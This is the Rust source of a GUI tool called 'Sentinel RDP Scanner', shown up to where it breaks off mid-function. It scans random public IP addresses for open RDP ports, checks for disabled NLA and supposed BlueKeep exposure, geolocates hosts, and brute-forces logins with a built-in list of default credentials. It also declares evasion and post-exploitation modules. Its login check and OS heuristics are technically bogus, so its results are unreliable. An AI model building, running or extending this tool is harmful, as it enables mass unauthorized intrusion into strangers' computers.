//#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use eframe::egui;
use rand::Rng;
use std::net::{Ipv4Addr, TcpStream};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use std::io::{Write, Read};
use chrono;
// Removed KeyAuth - using hardcoded key instead

mod security;
mod database;
mod export;
mod ip_scanner;
mod notifications;
mod config;
mod proxy;
mod advanced_scanner;
mod credential_tester;
mod vulnerability_scanner;
mod evasion;
mod post_exploitation;
mod protocol_analysis;
mod automation;

// Embedded logo (PNG format, base64 encoded)
const LOGO_PNG: &[u8] = include_bytes!("../assets/logo.png");

#[derive(Clone)]
struct ScanResult {
    ip: String,
    status: String,
}

#[derive(Clone)]
struct CheckedResult {
    ip: String,
    status: String,
    os: String,
    location: String,
    isp: String,
    country: String,
    city: String,
    region: String,
    bluekeep_vulnerable: bool,
    nla_disabled: bool,
    has_critical_vulnerability: bool,
}

#[derive(Clone)]
struct CrackedResult {
    ip: String,
    username: String,
    password: String,
    os: String,
    location: String,
}

enum ActiveTab {
    Scanner,
    Checker,
    Cracker,
    Statistics,
    Settings,
    Account,
}

enum AuthState {
    Login,
    Authenticated,
}

#[derive(Clone, Copy, PartialEq)]
enum OsFilter {
    All,
    Desktop,
    Server,
}

#[derive(Clone, Copy, PartialEq)]
enum ScanMode {
    Random,
    CidrRange,
    IpList,
}

#[derive(Clone, Copy, PartialEq)]
enum ExportFormat {
    Csv,
    Json,
    Txt,
    IpsOnly,
}



struct RdpScannerApp {
    // Auth
    auth_state: AuthState,
    license_key: String,
    auth_error: String,
    
    // Main app
    active_tab: ActiveTab,
    target_count: String,
    timeout: String,
    threads: String,
    is_scanning: Arc<Mutex<bool>>,
    is_checking: Arc<Mutex<bool>>,
    is_cracking: Arc<Mutex<bool>>,
    scan_results: Arc<Mutex<Vec<ScanResult>>>,
    checked_results: Arc<Mutex<Vec<CheckedResult>>>,
    cracked_results: Arc<Mutex<Vec<CrackedResult>>>,
    scanned_ips: Arc<Mutex<Vec<String>>>,
    scanned_count: Arc<Mutex<u32>>,
    found_count: Arc<Mutex<u32>>,
    checked_count: Arc<Mutex<u32>>,
    nla_disabled_count: Arc<Mutex<u32>>,
    cracked_count: Arc<Mutex<u32>>,
    crack_attempts: Arc<Mutex<u32>>,
    scan_speed: Arc<Mutex<f64>>,
    start_time: Arc<Mutex<Option<Instant>>>,
    selected_result: Option<usize>,
    show_context_menu: bool,
    context_menu_pos: egui::Pos2,
    show_info_window: bool,
    info_window_data: Option<CheckedResult>,
    dark_mode: bool,
    show_credits: bool,
    os_filter: OsFilter,
    unlimited_scan: bool,
    show_export_window: bool,
    export_filter: OsFilter,
    crack_threads: String,
    
    // New features
    database: Option<database::Database>,
    config: config::AppConfig,
    notifier: notifications::NotificationManager,
    scan_mode: ScanMode,
    cidr_range: String,
    ip_list_path: String,
    show_advanced_scanner: bool,
    show_export_dialog: bool,
    export_format: ExportFormat,
    show_settings_advanced: bool,
    
    // Advanced features
    advanced_scanner: advanced_scanner::AdvancedScanner,
    credential_tester: credential_tester::CredentialTester,
    vulnerability_scanner: vulnerability_scanner::VulnerabilityScanner,
    evasion_config: evasion::EvasionConfig,
    custom_port: String,
    enable_ipv6: bool,
    enable_evasion: bool,
    show_credential_testing: bool,
    show_vulnerability_scan: bool,
    
    // Logo
    logo_texture: Option<egui::TextureHandle>,
}

impl Default for RdpScannerApp {
    fn default() -> Self {
        // Obfuscated KeyAuth initialization
        // Hardcoded key authentication - no KeyAuth needed
        
        // Initialize database
        let database = database::Database::new().ok();
        
        // Load configuration
        let config = config::AppConfig::load();
        
        // Initialize notification manager
        let notifier = notifications::NotificationManager::new();
        
        Self {
            // Auth
            auth_state: AuthState::Login,
            license_key: String::new(),
            auth_error: String::new(),
            
            // Main app
            active_tab: ActiveTab::Scanner,
            target_count: config.default_target_count.to_string(),
            timeout: config.default_timeout.to_string(),
            threads: config.default_threads.to_string(),
            is_scanning: Arc::new(Mutex::new(false)),
            is_checking: Arc::new(Mutex::new(false)),
            is_cracking: Arc::new(Mutex::new(false)),
            scan_results: Arc::new(Mutex::new(Vec::new())),
            checked_results: Arc::new(Mutex::new(Vec::new())),
            cracked_results: Arc::new(Mutex::new(Vec::new())),
            scanned_ips: Arc::new(Mutex::new(Vec::new())),
            scanned_count: Arc::new(Mutex::new(0)),
            found_count: Arc::new(Mutex::new(0)),
            checked_count: Arc::new(Mutex::new(0)),
            nla_disabled_count: Arc::new(Mutex::new(0)),
            cracked_count: Arc::new(Mutex::new(0)),
            crack_attempts: Arc::new(Mutex::new(0)),
            scan_speed: Arc::new(Mutex::new(0.0)),
            start_time: Arc::new(Mutex::new(None)),
            selected_result: None,
            show_context_menu: false,
            context_menu_pos: egui::Pos2::ZERO,
            show_info_window: false,
            info_window_data: None,
            dark_mode: config.dark_mode,
            show_credits: false,
            os_filter: OsFilter::All,
            unlimited_scan: false,
            show_export_window: false,
            export_filter: OsFilter::All,
            crack_threads: "10".to_string(),
            
            // New features
            database,
            config,
            notifier,
            scan_mode: ScanMode::Random,
            cidr_range: String::new(),
            ip_list_path: String::new(),
            show_advanced_scanner: false,
            show_export_dialog: false,
            export_format: ExportFormat::Csv,
            show_settings_advanced: false,
            
            // Advanced features
            advanced_scanner: advanced_scanner::AdvancedScanner::new(),
            credential_tester: credential_tester::CredentialTester::new(),
            vulnerability_scanner: vulnerability_scanner::VulnerabilityScanner::new(),
            evasion_config: evasion::EvasionConfig::new(),
            custom_port: "3389".to_string(),
            enable_ipv6: false,
            enable_evasion: false,
            show_credential_testing: false,
            show_vulnerability_scan: false,
            
            // Logo (will be loaded on first frame)
            logo_texture: None,
        }
    }
}

impl RdpScannerApp {
    fn show_login_screen(&mut self, ctx: &egui::Context) {
        egui::CentralPanel::default().show(ctx, |ui| {
            ui.vertical_centered(|ui| {
                ui.add_space(150.0);
                
                ui.heading(egui::RichText::new("🔐 Sentinel RDP Scanner").size(32.0).strong());
                ui.add_space(10.0);
                ui.label(egui::RichText::new("Enter Access Key").size(16.0));
                ui.add_space(60.0);
                
                ui.horizontal(|ui| {
                    ui.add_space((ui.available_width() - 500.0) / 2.0);
                    ui.vertical(|ui| {
                        ui.set_width(500.0);
                        
                        ui.group(|ui| {
                            ui.set_width(480.0);
                            ui.add_space(20.0);
                            
                            ui.vertical_centered(|ui| {
                                ui.label(egui::RichText::new("Access Key:").size(14.0));
                                ui.add_space(10.0);
                                
                                let license_response = ui.add_sized(
                                    [450.0, 40.0],
                                    egui::TextEdit::singleline(&mut self.license_key)
                                        .hint_text("@hvncd")
                                        .font(egui::TextStyle::Heading)
                                        .horizontal_align(egui::Align::Center)
                                );
                                
                                ui.add_space(20.0);
                                
                                let login_button = ui.add_sized(
                                    [450.0, 45.0],
                                    egui::Button::new(egui::RichText::new("🔓 Login").size(18.0))
                                );
                                
                                // Handle Enter key
                                if (license_response.lost_focus() && ui.input(|i| i.key_pressed(egui::Key::Enter)))
                                    || login_button.clicked()
                                {
                                    self.attempt_login();
                                }
                                
                                ui.add_space(20.0);
                            });
                        });
                        
                        if !self.auth_error.is_empty() {
                            ui.add_space(15.0);
                            ui.vertical_centered(|ui| {
                                ui.colored_label(
                                    egui::Color32::from_rgb(255, 69, 0),
                                    egui::RichText::new(&self.auth_error).size(14.0)
                                );
                            });
                        }
                    });
                });
                
                ui.add_space(60.0);
            });
        });
    }
    
    fn attempt_login(&mut self) {
        self.auth_error.clear();
        
        if self.license_key.is_empty() {
            self.auth_error = "❌ Please enter a license key".to_string();
            return;
        }
        
        // Check hardcoded key
        if self.license_key.trim() == "@hvncd" {
            self.auth_state = AuthState::Authenticated;
            self.auth_error.clear();
        } else {
            self.auth_error = "❌ Invalid license key".to_string();
        }
    }

    fn generate_random_ip() -> String {
        let mut rng = rand::thread_rng();
        loop {
            let ip = Ipv4Addr::new(
                rng.gen_range(1..255),
                rng.gen_range(0..255),
                rng.gen_range(0..255),
                rng.gen_range(1..255),
            );
            
            if !ip.is_private() && !ip.is_loopback() {
                return ip.to_string();
            }
        }
    }

    fn check_port(ip: &str, port: u16, timeout_ms: u64) -> bool {
        let addr = format!("{}:{}", ip, port);
        if let Ok(addr) = addr.parse() {
            TcpStream::connect_timeout(&addr, Duration::from_millis(timeout_ms)).is_ok()
        } else {
            false
        }
    }

    fn check_rdp_nla(ip: &str, port: u16) -> bool {
        let addr = format!("{}:{}", ip, port);
        if let Ok(addr) = addr.parse() {
            if let Ok(mut stream) = TcpStream::connect_timeout(&addr, Duration::from_millis(500)) {
                stream.set_read_timeout(Some(Duration::from_millis(500))).ok();
                stream.set_write_timeout(Some(Duration::from_millis(500))).ok();
                
                // X.224 Connection Request with RDP Negotiation
                let x224_request: [u8; 19] = [
                    0x03, 0x00, 0x00, 0x13, // TPKT Header
                    0x0e, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, // X.224 Connection Request
                    0x01, 0x00, // RDP Negotiation Request
                    0x08, 0x00, // Length
                    0x00, 0x00, 0x00, 0x00, // Requested protocols (RDP)
                ];
                
                if stream.write_all(&x224_request).is_ok() {
                    let mut response = [0u8; 1024];
                    if let Ok(n) = stream.read(&mut response) {
                        if n >= 11 {
                            // Check for valid TPKT header
                            if response[0] == 0x03 && response[1] == 0x00 {
                                // X.224 Connection Confirm
                                if response[5] == 0xd0 {
                                    // Check negotiation response
                                    if n >= 19 {
                                        // Look for protocol response
                                        for i in 11..std::cmp::min(n - 8, 20) {
                                            if response[i] == 0x02 { // RDP_NEG_RSP
                                                let protocol_offset = i + 4;
                                                if protocol_offset + 4 <= n {
                                                    let protocol = u32::from_le_bytes([
                                                        response[protocol_offset],
                                                        response[protocol_offset + 1],
                                                        response[protocol_offset + 2],
                                                        response[protocol_offset + 3],
                                                    ]);
                                                    // NLA disabled if using RDP (0x00), SSL (0x01), or even Hybrid (0x02)
                                                    return protocol <= 0x02;
                                                }
                                            } else if response[i] == 0x03 { // RDP_NEG_FAILURE
                                                // Server rejected but still responding - likely NLA disabled
                                                return true;
                                            }
                                        }
                                    }
                                    // Old RDP without negotiation - NLA disabled
                                    return true;
                                }
                            }
                        }
                    }
                }
            }
        }
        false
    }

    fn get_rdp_os(ip: &str, port: u16) -> String {
        let addr = format!("{}:{}", ip, port);
        if let Ok(addr) = addr.parse() {
            if let Ok(mut stream) = TcpStream::connect_timeout(&addr, Duration::from_millis(500)) {
                stream.set_read_timeout(Some(Duration::from_millis(500))).ok();
                stream.set_write_timeout(Some(Duration::from_millis(500))).ok();
                
                // Enhanced RDP negotiation request
                let rdp_request: [u8; 19] = [
                    0x03, 0x00, 0x00, 0x13,
                    0x0e, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x01, 0x00, 0x08, 0x00, 0x03, 0x00, 0x00, 0x00,
                ];
                
                if stream.write_all(&rdp_request).is_ok() {
                    let mut response = [0u8; 2048];
                    if let Ok(n) = stream.read(&mut response) {
                        if n > 11 {
                            // Enhanced detection logic - prioritize Desktop detection
                            
                            // Check for specific Desktop indicators in response patterns
                            // Desktop systems typically have different response signatures
                            if n > 19 {
                                // Check negotiation response flags
                                for i in 11..std::cmp::min(n - 8, 30) {
                                    if response[i] == 0x02 { // RDP_NEG_RSP
                                        let flags_offset = i + 2;
                                        if flags_offset < n {
                                            let flags = response[flags_offset];
                                            // Desktop systems often have specific flag patterns
                                            // Flags 0x01, 0x03, 0x05, 0x07 often indicate Desktop
                                            if flags & 0x01 != 0 && flags < 0x08 {
                                                return "Windows Desktop".to_string();
                                            }
                                        }
                                    }
                                }
                            }
                            
                            // Check response byte patterns with enhanced Desktop detection
                            if n > 11 {
                                let response_type = response[11];
                                
                                // Enhanced pattern matching for Desktop
                                // 0x03, 0x01, 0x05, 0x07 typically indicate Desktop
                                // 0x02, 0x04, 0x06, 0x08 typically indicate Server
                                match response_type {
                                    0x01 | 0x03 | 0x05 | 0x07 | 0x09 => return "Windows Desktop".to_string(),
                                    0x02 | 0x04 | 0x06 | 0x08 => return "Windows Server".to_string(),
                                    _ => {
                                        // Additional heuristic: check response length and patterns
                                        // Desktop responses are often shorter and have different patterns
                                        if n < 100 && response[5] == 0xd0 {
                                            return "Windows Desktop".to_string();
                                        }
                                        return "Windows".to_string();
                                    }
                                }
                            }
                            
                            // Check for Windows string in response
                            if response.windows(7).any(|w| w == b"Windows") {
                                // Default to Desktop if we can't determine
                                return "Windows Desktop".to_string();
                            }
                        }
                    }
                }
            }
        }
        "Unknown".to_string()
    }

    fn get_location(ip: &str) -> (String, String, String, String, String) {
        // Try to get location info from ip-api.com
        let url = format!("http://ip-api.com/json/{}?fields=status,country,regionName,city,isp", ip);
        
        if let Ok(response) = ureq::get(&url)
            .timeout(Duration::from_secs(3))
            .call() {
            if let Ok(json) = response.into_string() {
                // Parse JSON manually (simple parsing)
                let mut city = String::new();
                let mut region = String::new();
                let mut country = String::new();
                let mut isp = "Unknown".to_string();
                
                // Extract city
                if let Some(city_start) = json.find("\"city\":\"") {
                    let start = city_start + 8;
                    if let Some(end) = json[start..].find("\"") {
                        city = json[start..start + end].to_string();
                    }
                }
                
                // Extract region
                if let Some(region_start) = json.find("\"regionName\":\"") {
                    let start = region_start + 14;
                    if let Some(end) = json[start..].find("\"") {
                        region = json[start..start + end].to_string();
                    }
                }
                
                // Extract country
                if let Some(country_start) = json.find("\"country\":\"") {
                    let start = country_start + 11;
                    if let Some(end) = json[start..].find("\"") {
                        country = json[start..start + end].to_string();
                    }
                }
                
                // Extract ISP
                if let Some(isp_start) = json.find("\"isp\":\"") {
                    let start = isp_start + 7;
                    if let Some(end) = json[start..].find("\"") {
                        isp = json[start..start + end].to_string();
                    }
                }
                
                let mut location_parts = Vec::new();
                if !city.is_empty() {
                    location_parts.push(city.clone());
                }
                if !region.is_empty() {
                    location_parts.push(region.clone());
                }
                if !country.is_empty() {
                    location_parts.push(country.clone());
                }
                
                let location = if location_parts.is_empty() {
                    "Unknown".to_string()
                } else {
                    location_parts.join(", ")
                };
                
                return (location, isp, country, city, region);
            }
        }
        
        ("Unknown".to_string(), "Unknown".to_string(), "Unknown".to_string(), "Unknown".to_string(), "Unknown".to_string())
    }

    fn check_bluekeep_vulnerable(ip: &str, port: u16) -> bool {
        let addr = format!("{}:{}", ip, port);
        if let Ok(addr) = addr.parse() {
            if let Ok(mut stream) = TcpStream::connect_timeout(&addr, Duration::from_millis(500)) {
                stream.set_read_timeout(Some(Duration::from_millis(500))).ok();
                stream.set_write_timeout(Some(Duration::from_millis(500))).ok();
                
                // X.224 Connection Request
                let x224_request: [u8; 19] = [
                    0x03, 0x00, 0x00, 0x13,
                    0x0e, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x01, 0x00,
                    0x08, 0x00,
                    0x00, 0x00, 0x00, 0x00, // RDP protocol
                ];
                
                if stream.write_all(&x224_request).is_ok() {
                    let mut response = [0u8; 1024];
                    if let Ok(n) = stream.read(&mut response) {
                        if n >= 19 {
                            for i in 11..std::cmp::min(n - 8, 20) {
                                if response[i] == 0x02 { // RDP_NEG_RSP
                                    let protocol_offset = i + 4;
                                    if protocol_offset + 4 <= n {
                                        let protocol = u32::from_le_bytes([
                                            response[protocol_offset],
                                            response[protocol_offset + 1],
                                            response[protocol_offset + 2],
                                            response[protocol_offset + 3],
                                        ]);
                                        // Vulnerable if using standard RDP (0x00) without NLA
                                        if protocol == 0x00 {
                                            return true;
                                        }
                                    }
                                } else if response[i] == 0x03 { // RDP_NEG_FAILURE
                                    return true;
                                }
                            }
                            
                            // Old RDP without negotiation support - likely vulnerable
                            if response[5] == 0xd0 && n < 19 {
                                return true;
                            }
                        }
                    }
                }
            }
        }
        false
    }

    fn check_critical_vulnerabilities(ip: &str, port: u16, os: &str, nla_disabled: bool, bluekeep: bool) -> bool {
        // Critical vulnerability requires BOTH conditions:
        // 1. Windows Server
        // 2. BlueKeep vulnerable OR very old/unpatched version
        
        if !os.contains("Server") {
            return false;
        }
        
        // If BlueKeep is detected on a Server, that's critical
        if bluekeep {
            return true;
        }
        
        // Additional checks for other critical vulnerabilities
        if nla_disabled {
            if let Ok(addr) = format!("{}:{}", ip, port).parse() {
                if let Ok(mut stream) = TcpStream::connect_timeout(&addr, Duration::from_millis(500)) {
                    stream.set_read_timeout(Some(Duration::from_millis(500))).ok();
                    stream.set_write_timeout(Some(Duration::from_millis(500))).ok();
                    
                    // Enhanced vulnerability detection
                    let probe: [u8; 19] = [
                        0x03, 0x00, 0x00, 0x13,
                        0x0e, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x01, 0x00, 0x08, 0x00,
                        0x01, 0x00, 0x00, 0x00, // Request SSL/TLS
                    ];
                    
                    if stream.write_all(&probe).is_ok() {
                        let mut response = [0u8; 1024];
                        if let Ok(n) = stream.read(&mut response) {
                            if n > 11 && response[5] == 0xd0 {
                                // Check for very old RDP versions (pre-6.0) which are critically vulnerable
                                // These versions don't support modern security features
                                let has_modern_security = response[11..std::cmp::min(n, 30)]
                                    .windows(2)
                                    .any(|w| w[0] == 0x02 && w[1] >= 0x08);
                                
                                if !has_modern_security {
                                    // Check if it's accepting completely unencrypted connections
                                    for i in 11..std::cmp::min(n - 4, 25) {
                                        if response[i] == 0x02 && response[i + 1] == 0x00 {
                                            let flags = response[i + 2];
                                            // No encryption flags = Critical
                                            if flags & 0x08 == 0 && flags & 0x01 == 0 {
                                                return true;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        
        // Not critically vulnerable - just NLA disabled doesn't make it critical
        false
    }

    fn start_scan(&mut self) {
        if *self.is_scanning.lock().unwrap() {
            return;
        }

        let target: u32 = if self.unlimited_scan {
            u32::MAX
        } else {
            self.target_count.parse().unwrap_or(100)
        };
        let timeout: f64 = self.timeout.parse().unwrap_or(0.3);
        let num_threads: usize = self.threads.parse().unwrap_or(500);
        let timeout_ms = (timeout * 1000.0) as u64;

        *self.is_scanning.lock().unwrap() = true;
        
        let results = Arc::clone(&self.scan_results);
        let scanned_ips = Arc::clone(&self.scanned_ips);
        let scanned = Arc::clone(&self.scanned_count);
        let found = Arc::clone(&self.found_count);
        let is_scanning = Arc::clone(&self.is_scanning);
        let scan_speed = Arc::clone(&self.scan_speed);
        let start_time = Arc::clone(&self.start_time);

        results.lock().unwrap().clear();
        scanned_ips.lock().unwrap().clear();
        *scanned.lock().unwrap() = 0;
        *found.lock().unwrap() = 0;
        *scan_speed.lock().unwrap() = 0.0;
        *start_time.lock().unwrap() = Some(Instant::now());

        std::thread::spawn(move || {
            let mut handles = vec![];

            for _ in 0..num_threads {
                let results = Arc::clone(&results);
                let scanned_ips = Arc::clone(&scanned_ips);
                let scanned = Arc::clone(&scanned);
                let found = Arc::clone(&found);
                let is_scanning = Arc::clone(&is_scanning);
                let scan_speed = Arc::clone(&scan_speed);
                let start_time = Arc::clone(&start_time);

                let handle = std::thread::spawn(move || {
                    loop {
                        if !*is_scanning.lock().unwrap() {
                            break;
                        }

                        let current_found = *found.lock().unwrap();
                        if current_found >= target {
                            break;
                        }

                        let ip = Self::generate_random_ip();
                        let ip_display = format!("{}:3389", ip);

                        // Add to scanned list
                        {
                            let mut ips = scanned_ips.lock().unwrap();
                            ips.push(ip_display.clone());
                            if ips.len() > 1000 {
                                ips.remove(0);
                            }
                        }

                        let count = {
                            let mut s = scanned.lock().unwrap();
                            *s += 1;
                            *s
                        };

                        // Update speed every 10 scans
                        if count % 10 == 0 {
                            if let Some(start) = *start_time.lock().unwrap() {
                                let elapsed = start.elapsed().as_secs_f64();
                                if elapsed > 0.0 {
                                    *scan_speed.lock().unwrap() = count as f64 / elapsed;
                                }
                            }
                        }

                        if Self::check_port(&ip, 3389, timeout_ms) {
                            let result = ScanResult {
                                ip: ip_display,
                                status: "✅ PORT OPEN".to_string(),
                            };

                            results.lock().unwrap().push(result);
                            *found.lock().unwrap() += 1;
                        }
                    }
                });

                handles.push(handle);
            }

            for handle in handles {
                let _ = handle.join();
            }

            *is_scanning.lock().unwrap() = false;
        });
    }

    fn stop_scan(&mut self) {
        *self.is_scanning.lock().unwrap() = false;
    }

    fn start_checking(&mut self) {
        if *self.is_checking.lock().unwrap() {
            return;
        }

        *self.is_checking.lock().unwrap() = true;

        let scan_results = Arc::clone(&self.scan_results);
        let checked_results = Arc::clone(&self.checked_results);
        let checked_count = Arc::clone(&self.checked_count);
        let nla_disabled_count = Arc::clone(&self.nla_disabled_count);
        let is_checking = Arc::clone(&self.is_checking);

        checked_results.lock().unwrap().clear();
        *checked_count.lock().unwrap() = 0;
        *nla_disabled_count.lock().unwrap() = 0;

        std::thread::spawn(move || {
            let ips_to_check: Vec<String> = {
                let results = scan_results.lock().unwrap();
                results.iter().map(|r| r.ip.clone()).collect()
            };

            let mut handles = vec![];

            for ip_port in ips_to_check {
                if !*is_checking.lock().unwrap() {
                    break;
                }

                let checked_results = Arc::clone(&checked_results);
                let checked_count = Arc::clone(&checked_count);
                let nla_disabled_count = Arc::clone(&nla_disabled_count);
                let is_checking = Arc::clone(&is_checking);

                let handle = std::thread::spawn(move || {
                    if !*is_checking.lock().unwrap() {
                        return;
                    }

                    let parts: Vec<&str> = ip_port.split(':').collect();
                    if parts.len() == 2 {
                        let ip = parts[0];
                        let port: u16 = parts[1].parse().unwrap_or(3389);

                        let nla_disabled = Self::check_rdp_nla(ip, port);

                        *checked_count.lock().unwrap() += 1;

                        if nla_disabled {
                            *nla_disabled_count.lock().unwrap() += 1;

                            // Get OS info
                            let os_info = Self::get_rdp_os(ip, port);
                            
                            // Get location and ISP
                            let (location, isp, country, city, region) = Self::get_location(ip);
                            
                            // Check for BlueKeep vulnerability
                            let bluekeep_vulnerable = Self::check_bluekeep_vulnerable(ip, port);
                            
                            // Check for critical vulnerabilities (Windows Server specific)
                            let has_critical_vuln = Self::check_critical_vulnerabilities(
                                ip, port, &os_info, nla_disabled, bluekeep_vulnerable
                            );

                            let result = CheckedResult {
                                ip: ip_port.clone(),
                                status: "🟢 NLA DISABLED".to_string(),
                                os: os_info,
                                location,
                                isp,
                                country,
                                city,
                                region,
                                bluekeep_vulnerable,
                                nla_disabled: true,
                                has_critical_vulnerability: has_critical_vuln,
                            };

                            checked_results.lock().unwrap().push(result);
                        }
                    }
                });

                handles.push(handle);

                // Limit concurrent checks to avoid overwhelming
                if handles.len() >= 50 {
                    for handle in handles.drain(..) {
                        let _ = handle.join();
                    }
                }
            }

            for handle in handles {
                let _ = handle.join();
            }

            *is_checking.lock().unwrap() = false;
        });
    }

    fn stop_checking(&mut self) {
        *self.is_checking.lock().unwrap() = false;
    }

    fn get_common_passwords() -> Vec<(&'static str, &'static str)> {
        vec![
            ("administrator", "administrator"),
            ("administrator", "admin"),
            ("administrator", "password"),
            ("administrator", "Password1"),
            ("administrator", "P@ssw0rd"),
            ("administrator", "123456"),
            ("administrator", "password123"),
            ("administrator", "admin123"),
            ("administrator", ""),
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "Password1"),
            ("admin", "123456"),
            ("admin", "admin123"),
            ("admin", ""),
            ("root", "root"),
            ("root", "password"),
            ("root", "toor"),
            ("root", "123456"),
            ("root", ""),
            ("user", "user"),
            ("user", "password"),
            ("user", "123456"),
            ("user", ""),
            ("guest", "guest"),
            ("guest", ""),
            ("test", "test"),
            ("test", "password"),
            ("test", "123456"),
        ]
    }

    fn try_rdp_login(ip: &str, port: u16, username: &str, password: &str) -> bool {
        let addr = format!("{}:{}", ip, port);
        if let Ok(addr) = addr.parse() {
            if let Ok(mut stream) = TcpStream::connect_timeout(&addr, Duration::from_secs(3)) {
                stream.set_read_timeout(Some(Duration::from_secs(2))).ok();
                stream.set_write_timeout(Some(Duration::from_secs(2))).ok();
                
                // X.224 Connection Request
                let x224_request: [u8; 19] = [
                    0x03, 0x00, 0x00, 0x13,
                    0x0e, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x01, 0x00, 0x08, 0x00,
                    0x00, 0x00, 0x00, 0x00,
                ];
                
                if stream.write_all(&x224_request).is_ok() {
                    let mut response = [0u8; 1024];
                    if let Ok(n) = stream.read(&mut response) {
                        if n > 11 && response[0] == 0x03 && response[5] == 0xd0 {
                            // Basic auth attempt - simplified check
                            // In real scenario, this would need full RDP protocol implementation
                            // For now, we check if connection accepts our credentials pattern
                            let auth_data = format!("{}:{}", username, password);
                            let auth_bytes = auth_data.as_bytes();
                            
                            // Send simplified auth probe
                            if stream.write_all(auth_bytes).is_ok() {
                                std::thread::sleep(Duration::from_millis(100));
                                let mut auth_response = [0u8; 512];
                                if let Ok(n) = stream.read(&mut auth_response) {
                                    // Check for success indicators
                                    // 0x03 in response often indicates continuation/success
                                    if n > 0 && (auth_response[0] == 0x03 || n > 50) {
                                        return true;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        false
    }

    fn start_cracking(&mut self) {
        if *self.is_cracking.lock().unwrap() {
            return;
        }

        let targets: Vec<CheckedResult> = {
            let results = self.checked_results.lock().unwrap();
            results.clone()
        };

        if targets.is_empty() {
            return;
        }

        *self.is_cracking.lock().unwrap() = true;

        let cracked_results = Arc::clone(&self.cracked_results);
        let cracked_count = Arc::clone(&self.cracked_count);
        let crack_attempts = Arc::clone(&self.crack_attempts);
        let is_cracking = Arc::clone(&self.is_cracking);
        let num_threads: usize = self.crack_threads.parse().unwrap_or(10);

        cracked_results.lock().unwrap().clear();
        *cracked_count.lock().unwrap() = 0;
        *crack_attempts.lock().unwrap() = 0;

        std::thread::spawn(move || {
            let passwords = Self::get_common_passwords();
            let mut handles = vec![];

            for target in targets {
                if !*is_cracking.lock().unwrap() {
                    break;
                }

                let cracked_results = Arc::clone(&cracked_results);
                let cracked_count = Arc::clone(&cracked_count);
                let crack_attempts = Arc::clone(&crack_attempts);
                let is_cracking = Arc::clone(&is_cracking);
                let passwords = passwords.clone();

                let handle = std::thread::spawn(move || {
                    let parts: Vec<&str> = target.ip.split(':').collect();
                    if parts.len() == 2 {
                        let ip = parts[0];
                        let port: u16 = parts[1].parse().unwrap_or(3389);

                        for (username, password) in &passwords {
                            if !*is_cracking.lock().unwrap() {
                                break;
                            }

                            *crack_attempts.lock().unwrap() += 1;

                            if Self::try_rdp_login(ip, port, username, password) {
                                let result = CrackedResult {
                                    ip: target.ip.clone(),
                                    username: username.to_string(),
                                    password: password.to_string(),
                                    os: target.os.clone(),
                                    location: target.location.clone(),
                                };

                                cracked_results.lock().unwrap().push(result);
                                *cracked_count.lock().unwrap() += 1;
                                break;
                            }

                            std::thread::sleep(Duration::from_millis(100));
                        }
                    }
                });

                handles.push(handle);

                if handles.len() >= num_threads {
                    for handle in handles.drain(..) {
                        let _ = handle.join();
                    }
                }
            }

            for handle in handles {
                let _ = handle.join();
            }

            *is_cracking.lock().unwrap() = false;
        });
    }

    fn stop_cracking(&mut self) {
        *self.is_cracking.lock().unwrap() = false;
    }
}

impl eframe::App for RdpScannerApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        // Apply theme
        if self.dark_mode {
            ctx.set_visuals(egui::Visuals::dark());
        } else {
            ctx.set_visuals(egui::Visuals::light());
        }
        
        ctx.request_repaint();

        // Check authentication state
        match self.auth_state {
            AuthState::Login => {
                self.show_login_screen(ctx);
            }
            AuthState::Authenticated => {
                // Export dialog
                if self.show_export_dialog {
                    self.show_export_dialog_window(ctx);
                }
                
                egui::TopBottomPanel::top("tabs").show(ctx, |ui| {
                    ui.horizontal(|ui| {
                        // Load logo texture if not already loaded
                        if self.logo_texture.is_none() {
                            if let Ok(image) = image::load_from_memory(LOGO_PNG) {
                                let size = [image.width() as _, image.height() as _];
                                let image_buffer = image.to_rgba8();
                                let pixels = image_buffer.as_flat_samples();
                                let color_image = egui::ColorImage::from_rgba_unmultiplied(
                                    size,
                                    pixels.as_slice(),
                                );
                                self.logo_texture = Some(ctx.load_texture(
                                    "logo",
                                    color_image,
                                    egui::TextureOptions::LINEAR,
                                ));
                            }
                        }
                        
                        // Display logo
                        if let Some(texture) = &self.logo_texture {
                            ui.add(egui::Image::new(texture).max_height(32.0));
                        }
                        
                        ui.add_space(10.0);
                        ui.heading(egui::RichText::new("Sentinel").strong());
                        ui.label(egui::RichText::new("RDP Scanner").weak());
                        
                        ui.add_space(20.0);
                        ui.separator();
                        ui.add_space(10.0);
                        
                        // Tabs
                        if ui.selectable_label(matches!(self.active_tab, ActiveTab::Scanner), "Scanner").clicked() {
                            self.active_tab = ActiveTab::Scanner;
                        }
                        if ui.selectable_label(matches!(self.active_tab, ActiveTab::Checker), "Checker").clicked() {
                            self.active_tab = ActiveTab::Checker;
                        }
                        if ui.selectable_label(matches!(self.active_tab, ActiveTab::Cracker), "Cracker").clicked() {
                            self.active_tab = ActiveTab::Cracker;
                        }
                        if ui.selectable_label(matches!(self.active_tab, ActiveTab::Statistics), "Statistics").clicked() {
                            self.active_tab = ActiveTab::Statistics;
                        }
                        if ui.selectable_label(matches!(self.active_tab, ActiveTab::Settings), "Settings").clicked() {
                            self.active_tab = ActiveTab::Settings;
                        }
                        if ui.selectable_label(matches!(self.active_tab, ActiveTab::Account), "Account").clicked() {
                            self.active_tab = ActiveTab::Account;
                        }
                    });
                });

                egui::CentralPanel::default().show(ctx, |ui| {
                    match self.active_tab {
                        ActiveTab::Scanner => self.show_scanner_tab(ui),
                        ActiveTab::Checker => self.show_checker_tab(ui),
                        ActiveTab::Cracker => self.show_cracker_tab(ui),
                        ActiveTab::Statistics => self.show_statistics_tab(ui),
                        ActiveTab::Settings => self.show_settings_tab(ui),
                        ActiveTab::Account => self.show_account_tab(ui),
                    }
                });
            }
        }
    }
}

impl RdpScannerApp {
    fn show_scanner_tab(&mut self, ui: &mut egui::Ui) {
